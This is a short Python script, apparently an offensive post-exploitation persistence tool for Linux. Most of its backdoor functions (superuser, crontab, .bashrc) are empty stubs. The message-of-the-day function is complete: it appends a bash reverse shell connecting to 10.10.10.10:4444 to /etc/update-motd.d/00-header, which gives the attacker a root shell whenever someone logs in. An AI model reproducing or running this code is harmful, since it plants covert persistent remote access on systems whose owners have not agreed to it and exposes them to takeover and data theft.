def createSuperUser():
	#create superuser ftp with sudo perms
	pass

def createCronTabBackDoor():
	pass

def backDoorBashRC():
	pass

def backDoorMessageOfTheDay():
	with open('/etc/update-motd.d/00-header', 'a') as headerFile:
		headerFile.write('bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"') #update the ip and port accordingly

def main():
	backDoorMessageOfTheDay()
	backDoorBashRC()
	createCronTabBackDoor()
	createSuperUser()

if __name__ == '__main__':
	main()